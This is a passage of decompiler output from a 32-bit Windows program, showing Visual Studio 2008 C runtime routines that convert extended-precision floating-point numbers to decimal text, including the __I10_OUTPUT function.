                  if ((0x8000 < CONCAT11(uStack_2f,local_30)) ||
                     (iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a),
                     uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e),
                     (CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) & 0x1ffff) == 0x18000
                     )) {
                    if (CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) == -1) {
                      uStack_2e._0_2_ = 0;
                      uStack_2e._2_2_ = 0;
                      uVar13 = 0;
                      if (CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) == -1) {
                        uStack_2a._0_2_ = 0;
                        uStack_2a._2_2_ = 0;
                        if (uStack_26 == 0xffff) {
                          uStack_26 = 0x8000;
                          uVar17 = uVar17 + 1;
                          iVar1 = 0;
                          uVar13 = 0;
                        }
                        else {
                          uStack_26 = uStack_26 + 1;
                          iVar1 = 0;
                          uVar13 = 0;
                        }
                      }
                      else {
                        iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a) + 1;
                        uStack_2a._0_2_ = (ushort)iVar1;
                        uStack_2a._2_2_ = (ushort)((uint)iVar1 >> 0x10);
                      }
                    }
                    else {
                      uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e) + 1;
                      uStack_2e._0_2_ = (ushort)uVar13;
                      uStack_2e._2_2_ = (ushort)(uVar13 >> 0x10);
                      iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
                    }
                  }
                  uStack_2e._2_2_ = (ushort)(uVar13 >> 0x10);
                  uStack_2e._0_2_ = (ushort)uVar13;
                  uStack_2a._2_2_ = (ushort)((uint)iVar1 >> 0x10);
                  uStack_2a._0_2_ = (ushort)iVar1;
                  if (uVar17 < 0x7fff) {
                    local_40._0_2_ = (ushort)uStack_2e;
                    local_40._2_2_ = uStack_2e._2_2_;
                    local_3c._0_2_ = (ushort)uStack_2a;
                    local_3c._2_2_ = uStack_2a._2_2_;
                    uStack_38._0_2_ = uStack_26;
                    uStack_38._2_2_ = uVar17 | uVar20;
                    uVar11 = CONCAT22(uVar17 | uVar20,uStack_26);
                    uVar3 = uVar13;
                    iVar2 = iVar1;
                  }
                  else {
                    local_3c._0_2_ = 0;
                    local_3c._2_2_ = 0;
                    local_40._0_2_ = 0;
                    local_40._2_2_ = 0;
                    uVar11 = ((uVar20 == 0) - 1 & 0x80000000) + 0x7fff8000;
                    uStack_38._0_2_ = (ushort)uVar11;
                    uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
                    uVar3 = 0;
                    iVar2 = 0;
                  }
                }
                goto joined_r0x00426ba5;
              }
              uVar11 = 0;
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            else {
              local_3c._0_2_ = 0;
              local_3c._2_2_ = 0;
              uVar11 = ((uVar20 == 0) - 1 & 0x80000000) + 0x7fff8000;
              local_40._0_2_ = 0;
              local_40._2_2_ = 0;
            }
            uStack_38._0_2_ = (ushort)uVar11;
            uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
            uVar13 = 0;
            iVar1 = 0;
            uVar3 = 0;
            iVar2 = 0;
          }
          goto joined_r0x00426ba5;
        }
      }
      local_3c._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
      local_3c._0_2_ = (undefined2)iVar2;
      local_40._2_2_ = (undefined2)(uVar3 >> 0x10);
      local_40._0_2_ = (undefined2)uVar3;
      uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
      uStack_38._0_2_ = (ushort)uVar11;
      uVar21 = CONCAT22((undefined2)local_3c,local_40._2_2_);
      uVar19 = CONCAT22((ushort)uStack_38,local_3c._2_2_);
      uStack_4a = iVar15;
      uVar12 = uVar11;
      uStack_2e = uVar13;
      uStack_2a = iVar1;
      local_3c = iVar2;
    }
    else {
      uVar21 = 0;
      uStack_38._2_2_ = 0x7fff;
      uVar19 = 0x80000000;
      local_40._0_2_ = 0;
    }
  }
  else {
LAB_00426eaa:
    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    local_40._0_2_ = 0;
    uStack_38._2_2_ = 0;
    uVar19 = 0;
    uVar21 = 0;
  }
  *(undefined2 *)pld12->ld12 = (undefined2)local_40;
  *(ushort *)(pld12->ld12 + 10) = uStack_38._2_2_ | uVar7;
  *(undefined4 *)(pld12->ld12 + 2) = uVar21;
  *(undefined4 *)(pld12->ld12 + 6) = uVar19;
LAB_00426ec8:
  uStack_38 = uVar12;
  local_40 = uVar3;
  uVar13 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return uVar13;
}



// WARNING: Removing unreachable block (ram,0x00427443)
// WARNING: Removing unreachable block (ram,0x0042744d)
// WARNING: Removing unreachable block (ram,0x00427452)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2008 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  errno_t eVar7;
  ushort *puVar8;
  ushort uVar9;
  ushort uVar10;
  int *piVar11;
  int iVar12;
  ushort uVar13;
  uint uVar14;
  char cVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  int *local_6c;
  undefined *local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar4 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar9 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar9 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    iVar2 = iVar4;
    goto LAB_004277e0;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar9 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_0042703e;
        pcVar26 = "1#INF";
      }
      else {
        if (param_1 != 0) {
LAB_0042703e:
          pcVar26 = "1#QNAN";
          goto LAB_00427043;
        }
        pcVar26 = "1#IND";
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = "1#SNAN";
LAB_00427043:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_004277e0;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
  local_68 = &DAT_00433c60;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar5 = param_1;
    uVar14 = -uVar16;
    iVar2 = iVar4;
    if (0 < (int)uVar16) {
      local_68 = &DAT_00433dc0;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x54;
      if ((uVar14 & 7) != 0) {
        piVar11 = (int *)(local_68 + (uVar14 & 7) * 0xc);
        if (0x7fff < *(ushort *)piVar11) {
          local_40 = (undefined2)*piVar11;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar11 >> 0x10);
          piVar3 = piVar11 + 2;
          uStack_3e._2_2_ = (undefined2)piVar11[1];
          uStack_3a = (ushort)((uint)piVar11[1] >> 0x10);
          piVar11 = (int *)&local_40;
          local_38 = *piVar3;
          iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar2;
          uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar4 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)piVar11 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar10 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)piVar11 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar10;
        if (((uVar10 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar10 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_00427354;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, (piVar11[2] & 0x7fffffffU) == 0)) &&
                (piVar11[1] == 0)) && (*piVar11 == 0)) goto LAB_00427173;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = piVar11 + 2;
                do {
                  bVar6 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar6 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar6) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (int *)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_00427284:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar4 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar10 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar10 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_00427284;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar4 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar4 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar4;
                  local_c = (ushort)((uint)iVar4 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar4 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar4 >> 0x10);
            local_10._2_2_ = (ushort)iVar4;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar5 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar5 = 0;
              iVar12 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar12;
              local_1a = (undefined)((uint)iVar12 >> 0x10);
              bStack_19 = (byte)((uint)iVar12 >> 0x18);
            }
            goto LAB_00427354;
          }
LAB_00427173:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar5 = 0;
        iVar21 = 0;
        iVar4 = 0;
      }
LAB_00427354:
      uStack_20 = (ushort)((uint)iVar5 >> 0x10);
      local_24._2_2_ = (ushort)iVar5;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_00427618;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar8 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar6 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar8;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar8)) {
                bVar6 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar6) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar8 = puVar8 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_00427511:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar4 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar10 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar4 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar4;
            uStack_13 = (undefined)((uint)iVar4 >> 8);
            uStack_12 = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar4 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar4 >> 0x10);
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | uVar10 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_00427511;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_00427618;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_00427618:
  *param_6 = local_50;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar4 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar4 | (ushort)(uVar14 >> 0x1f);
      iVar5 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar5 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar4 >> 0x10);
      local_1a = (undefined)((uint)iVar5 >> 0x10);
      bStack_19 = (byte)((uint)iVar5 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar4 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar2 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar6 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar6 = true;
        }
        if (bVar6) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      iVar4 = (uVar22 + local_38) * 2;
      uStack_1c = (ushort)iVar4 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar4 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_004277e0;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar15 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar15;
    *(undefined *)(cVar15 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_004277e0:
  uStack_3e = iVar2;
  local_24 = uVar16;
  local_10 = param_2;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __hw_cw
// 
